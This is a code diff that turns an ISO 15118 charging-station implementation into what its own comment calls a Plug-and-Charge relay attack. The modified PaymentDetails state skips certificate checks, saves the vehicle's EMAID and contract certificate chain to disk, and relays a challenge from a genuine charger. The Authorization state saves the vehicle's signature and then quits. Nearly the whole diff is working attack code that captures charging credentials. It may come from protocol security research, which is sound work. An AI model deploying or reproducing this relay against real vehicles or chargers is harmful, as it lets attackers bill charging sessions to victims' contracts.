@@ -8,6 +8,8 @@ import asyncio
 import base64
 import logging
 import time
+import os
+import pickle
 from typing import List, Optional, Tuple, Type, Union
 
 from iso15118.secc.comm_session_handler import SECCCommunicationSession
@@ -893,8 +895,65 @@ class CertificateInstallation(StateSECC):
 
         return cert_install_res, signature
 
-
 class PaymentDetails(StateSECC):
+    """
+    The ISO 15118-2 state in which the SECC processes a
+    PaymentDetailsReq message from the EVCC.
+
+    Customized to perform a PnC relay attack
+    """
+
+    def __init__(self, comm_session: SECCCommunicationSession):
+        super().__init__(comm_session, Timeouts.V2G_SECC_SEQUENCE_TIMEOUT)
+
+    async def process_message(
+        self,
+        message: Union[
+            SupportedAppProtocolReq,
+            SupportedAppProtocolRes,
+            V2GMessageV2,
+            V2GMessageV20,
+            V2GMessageDINSPEC,
+        ],
+        message_exi: bytes = None,
+    ):
+        msg = self.check_msg_v2(message, [PaymentDetailsReq])
+        if not msg:
+            return
+
+        payment_details_req: PaymentDetailsReq = msg.body.payment_details_req
+
+        # simply write out emaid and cert and do not perform any actual cert checks ourselves
+        with open("pnc-cert.pickle", "wb") as fd:
+            pickle.dump({
+                "emaid": payment_details_req.emaid,
+                "chain": payment_details_req.cert_chain,
+            }, fd)
+
+        # now we wait for the regular charging station to generate a challenge
+        while not os.path.isfile("./gen-challenge.bin"):
+            await asyncio.sleep(0.05)
+        await asyncio.sleep(0.1)
+        with open("./gen-challenge.bin", "rb") as fd:
+            self.comm_session.gen_challenge = fd.read()
+
+        self.comm_session.emaid = payment_details_req.emaid
+        self.comm_session.contract_cert_chain = payment_details_req.cert_chain
+
+        payment_details_res = PaymentDetailsRes(
+            response_code=ResponseCode.OK,
+            gen_challenge=self.comm_session.gen_challenge,
+            evse_timestamp=time.time(),
+        )
+
+        self.create_next_message(
+            Authorization,
+            payment_details_res,
+            Timeouts.V2G_SECC_SEQUENCE_TIMEOUT,
+            Namespace.ISO_V2_MSG_DEF,
+        )
+
+class OriginalPaymentDetails(StateSECC):
     """
     The ISO 15118-2 state in which the SECC processes a
     PaymentDetailsReq message from the EVCC.
@@ -1138,6 +1197,11 @@ class Authorization(StateSECC):
             return
 
         authorization_req: AuthorizationReq = msg.body.authorization_req
+
+        with open("./pnc-signature.pickle", "wb") as fd:
+            pickle.dump(msg.header.signature, fd)
+
+        raise Exception("We have everything we want, we can now quit!")
 
         if self.comm_session.selected_auth_option == AuthEnum.PNC_V2:
             if not self.comm_session.contract_cert_chain:
